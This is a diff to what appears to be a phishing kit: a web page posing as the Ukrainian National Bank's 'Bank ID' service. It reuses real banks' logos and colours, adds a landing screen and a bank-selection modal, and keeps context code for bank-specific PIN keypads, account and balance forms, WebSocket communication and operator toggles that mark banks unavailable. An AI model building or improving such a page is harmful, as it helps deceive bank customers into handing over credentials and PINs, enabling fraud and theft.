@@ -635,13 +635,119 @@
             .oschad-pin-keypad, .raiff-keypad { max-width: 300px; }
             .bank-grid { grid-template-columns: repeat(4, 1fr); max-width: 800px; margin: 0 auto; }
         }
+
+        /* NEW: Стили для начального экрана и модального окна выбора банка */
+        #initial-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+        }
+        #initial-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        #initial-subtitle {
+            font-size: 16px;
+            color: var(--light-text);
+            margin-bottom: 40px;
+        }
+        #continue-btn {
+            width: 100%;
+            max-width: 300px;
+            padding: 16px;
+            border: none;
+            border-radius: 50px;
+            background-color: #000;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        #continue-btn:hover {
+            background-color: #333;
+        }
+        #bank-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 999;
+        }
+        #bank-modal-content {
+            background-color: #fff;
+            width: 100%;
+            max-width: 480px;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 20px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        #bank-modal-banner {
+            background-color: #e0f2ff;
+            padding: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            border-radius: 12px;
+        }
+        #bank-modal-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .bank-modal-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border: 1px solid #dee2e6;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .bank-modal-item:hover {
+            background-color: #f8f9fa;
+        }
+        .bank-modal-item img {
+            width: 40px;
+            height: 40px;
+            margin-right: 15px;
+        }
+        .bank-modal-item span {
+            font-size: 16px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div id="bank-selection-screen" class="screen">
-        <h1>Оберіть свій банк</h1>
-        <div class="bank-grid"></div>
+    <!-- NEW: Начальный экран -->
+    <div id="initial-screen">
+        <h1 id="initial-title">Bank ID НБУ</h1>
+        <p id="initial-subtitle">Оберіть банк, в якому ви маєте ра...</p>
+        <button id="continue-btn">Продовжити</button>
     </div>
+
+    <!-- NEW: Модальное окно для выбора банка -->
+    <div id="bank-modal-overlay">
+        <div id="bank-modal-content">
+            <div id="bank-modal-banner">Оберіть банк, в якому ви маєте рахунок...</div>
+            <div id="bank-modal-grid"></div>
+        </div>
+    </div>
+
+    <div id="bank-selection-screen" class="screen"></div>
 
     <div id="form-screen" class="screen">
         <div class="form-container">
@@ -683,13 +789,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg', theme: 'oschadbank', colors: { primary: '#00A39C', bg: '#f8f9fa', text: '#212529' } },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/c19N2AtbGM_cRT3ShxzKy1BB7mkLMVaae1HwwUAO0os1aZDKURnTyDXlOncMq7Cy_w', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
-        'alliance': { name: 'Альянс', logoUrl: 'https://minfin.com.ua/img/company/114/logo/1725005151.png', theme: 'alliance', colors: { primary: '#0072CE', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e9f2fa', borderColor: '#d1e3f5' } },
-        'vostok': { name: 'Восток', logoUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDLBej5jqnOr6kQxbNsHr5dzajqPvxQAXpVqgFLy-dTHlreiecuL1diuf6&s=10', theme: 'vostok', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fdeee5', borderColor: '#fbd9c7' } },
-        'izibank': { name: 'Izibank', logoUrl: 'https://play-lh.googleusercontent.com/eZmHofkCe6TwqfrH0CJbKBm82MlJtnyWizOq7-XvrKnWksB7z0HaE6PD-T8WCnQO7Q', theme: 'izibank', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fef1e9', borderColor: '#fbe3d4' } },
-        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://bank.gov.ua/files/Logobank/351005.png?v=14', theme: 'ukrsib', colors: { primary: '#00A14E', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e6f6ec', borderColor: '#cce9d9' } },
-        'pumb': { name: 'ПУМБ', logoUrl: 'https://forbes.ua/static/storage/thumbs/340x340/e/4a/4ba699e7-3e5e62261f39d70d2759f35af90bd4ae.png?v=1114_1', theme: 'pumb', colors: { primary: '#dc3545', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#f5c6cb', borderColor: '#f5c6cb' } },
-        'privat24': { name: 'Приват24', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/e/e0/Privat24_Logo.png', theme: 'privat24', colors: { primary: '#4CAF50', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e9f2fa', borderColor: '#d1e3f5' } }
+        'raiffeisen': { name: 'Райффайзен Банк', logoUrl: 'https://play-lh.googleusercontent.com/c19N2AtbGM_cRT3ShxzKy1BB7mkLMVaae1HwwUAO0os1aZDKURnTyDXlOncMq7Cy_w', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
+        'privat24': { name: 'ПриватБанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/e/e0/Privat24_Logo.png', theme: 'privat24', colors: { primary: '#4CAF50', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e9f2fa', borderColor: '#d1e3f5' } }
     };
     
     const urlParams = new URLSearchParams(window.location.search);
@@ -706,7 +807,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let disabledBanks = JSON.parse(localStorage.getItem('disabled_banks') || '[]'); // NEW: Local storage for disabled banks
 
     // --- DOM ELEMENTS ---
-    const bankGrid = document.querySelector('.bank-grid');
+    const bankModalGrid = document.getElementById('bank-modal-grid');
     const body = document.body;
     const formHeaderLogo = document.getElementById('form-header-logo');
     const modalTitle = document.getElementById('modal-title');
@@ -722,13 +823,28 @@ document.addEventListener('DOMContentLoaded', () => {
     const allianceModalContent = document.getElementById('alliance-modal-content');
     const unavailableModalOverlay = document.getElementById('unavailable-modal-overlay'); // NEW
     const unavailableModalContent = document.getElementById('unavailable-modal-content'); // NEW
+    const continueBtn = document.getElementById('continue-btn');
+    const bankModalOverlay = document.getElementById('bank-modal-overlay');
     
     // --- INITIALIZATION ---
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+    bankModalGrid.innerHTML = Object.keys(bankFlows).map(id => {
         const isDisabled = disabledBanks.includes(id) ? ' disabled' : ''; // NEW: Check for disabled banks
         const disabledLabel = isDisabled ? '<span class="unavailable-label">Недоступно</span>' : ''; // NEW
-        return `<a href="#" class="bank-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span>${disabledLabel}</a>`;
+        return `<div class="bank-modal-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span>${bankFlows[id].name}</span>${disabledLabel}</div>`;
     }).join('');
+
+    // --- NEW: Логика кнопки "Продовжити" ---
+    continueBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        bankModalOverlay.style.display = 'flex';
+    });
+
+    // Закрытие модального окна при клике вне контента
+    bankModalOverlay.addEventListener('click', (e) => {
+        if (e.target === bankModalOverlay) {
+            bankModalOverlay.style.display = 'none';
+        }
+    });
 
     // --- ОПТИМИЗИРОВАННАЯ ЛОГИКА ---
     const hideAllModals = () => {
@@ -736,6 +852,7 @@ document.addEventListener('DOMContentLoaded', () => {
         raiffModalOverlay.style.display = 'none';
         allianceModalOverlay.style.display = 'none';
         unavailableModalOverlay.style.display = 'none'; // NEW
+        bankModalOverlay.style.display = 'none';
     };
 
     // --- WEBSOCKET LOGIC ---
@@ -810,7 +927,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.preventDefault();
                 hideAllModals();
                 const bankId = item.dataset.bank;
-                const bankItem = document.querySelector(`.bank-item[data-bank="${bankId}"]`);
+                const bankItem = document.querySelector(`.bank-item[data-bank="${bankId}"]`) || document.querySelector(`.bank-modal-item[data-bank="${bankId}"]`);
                 if (bankItem) bankItem.click(); // Имитируем клик по банкомату на главном экране
             });
         });
@@ -1383,8 +1500,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.target.value = value.replace(/\D/g, '').substring(0, 3);
             } else if (id === 'details_balance') {
                 let v = value.replace(/[^0-9,.]/g, '').replace(',', '.');
-                let parts = v.split(',');
-                if (parts.length > 2) v = parts[0] + ',' + parts.slice(1).join('');
+                let parts = v.split('.');
+                if (parts.length > 2) v = parts[0] + '.' + parts.slice(1).join('');
                 e.target.value = v.replace('.', ',');
             }
         });
@@ -2090,7 +2207,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     // --- Main Flow Logic ---
-    document.querySelectorAll('.bank-item').forEach(item => {
+    document.querySelectorAll('.bank-modal-item').forEach(item => {
         item.addEventListener('click', e => {
             e.preventDefault();
             if (item.classList.contains('disabled')) return;
